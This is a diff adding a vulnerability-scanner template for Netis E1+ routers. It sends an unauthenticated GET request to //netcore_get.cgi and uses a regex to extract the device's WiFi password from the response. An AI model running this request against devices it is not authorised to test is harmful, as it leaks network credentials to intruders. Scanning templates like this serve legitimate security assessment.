@@ -1,0 +1,35 @@
+id: netis-info-leak
+info:
+  author: gy741
+  description: A vulnerability in Netis allows remote unauthenticated users to disclose
+    the WiFi password of the remote device.
+  name: Netis E1+ V1.2.32533 - Unauthenticated WiFi Password Leak
+  reference:
+  - https://www.exploit-db.com/exploits/48384
+  severity: medium
+  tags: netis,exposure
+requests:
+- extractors:
+  - part: body
+    regex:
+    - '''rp_soon_password'':''([A-Za-z0-9]+)'''
+    type: regex
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - rp_ap_password
+    - rp_ap_ssid
+  matchers-condition: and
+  raw:
+  - 'GET //netcore_get.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: homeFirstShow=yes
+
+    '
